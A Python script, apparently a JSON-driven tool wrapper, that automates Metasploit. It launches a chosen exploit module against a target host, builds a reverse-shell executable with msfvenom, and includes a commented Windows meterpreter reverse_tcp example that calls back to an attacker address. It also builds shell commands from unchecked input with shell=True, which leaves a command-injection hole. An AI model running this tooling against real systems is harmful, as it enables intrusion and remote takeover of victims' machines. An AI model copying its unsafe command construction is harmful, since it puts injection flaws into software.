import sys
import json
import subprocess
import tempfile
import os

def run_metasploit(params):
    try:
        mode = params.get("mode", "").lower()
        tool_path = params["toolpath"]  # e.g., path to msfconsole or msfvenom
        parameters = params.get("parameters", {})
        command = ""
        
        if mode == "exploit":
            # Required parameters for exploit mode
            module = parameters.get("module", "")
            target = parameters.get("target", "")
            payload = parameters.get("payload", "")
            lhost = parameters.get("lhost", "")
            lport = parameters.get("lport", "")
            additional = parameters.get("additional", "")  # any extra commands
            
            if not module or not target or not payload or not lhost or not lport:
                raise ValueError("module, target, payload, lhost, and lport are required for exploit mode")
            
            # Create a temporary resource file for msfconsole commands
            with tempfile.NamedTemporaryFile(mode="w", suffix=".rc", delete=False) as f:
                resource_content = f"""use {module}
set RHOSTS {target}
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
{additional}
run
exit
"""
                f.write(resource_content)
                resource_file = f.name
            
            command = f"{tool_path} -r {resource_file}"
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=600
            )
            os.unlink(resource_file)
        
        elif mode == "venom":
            # Use msfvenom to generate a payload
            payload = parameters.get("payload", "")
            lhost = parameters.get("lhost", "")
            lport = parameters.get("lport", "")
            output_file = parameters.get("output_file", "payload.bin")
            if not payload or not lhost or not lport:
                raise ValueError("payload, lhost, and lport are required for venom mode")
            
            # Example: msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=4444 -f exe -o payload.exe
            command = f"{tool_path} -p {payload} LHOST={lhost} LPORT={lport} -f exe -o {output_file}"
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=300
            )
        
        elif mode == "test":
            # Test mode: Display msfconsole version
            command = f"{tool_path} --version"
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=300
            )
        
        else:
            raise ValueError(f"Unsupported mode: {mode}")
        
        output = {
            "mode": mode,
            "command": command,
            "status": "Success" if result.returncode == 0 else "Failed",
            "exit_code": result.returncode,
            "output": result.stdout.strip(),
            "error": result.stderr.strip()
        }
        
        print(json.dumps(output, indent=4))
    
    except subprocess.TimeoutExpired:
        error_output = {
            "error": "Command timed out",
            "mode": mode
        }
        print(json.dumps(error_output, indent=4))
    except Exception as e:
        error_output = {
            "error": str(e),
            "mode": mode
        }
        print(json.dumps(error_output, indent=4))

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(json.dumps({"error": "No parameters provided"}, indent=4))
        sys.exit(1)
    
    try:
        input_json = sys.argv[1]
        params = json.loads(input_json)
        run_metasploit(params)
    except json.JSONDecodeError:
        print(json.dumps({"error": "Invalid JSON input"}, indent=4))
        sys.exit(1)
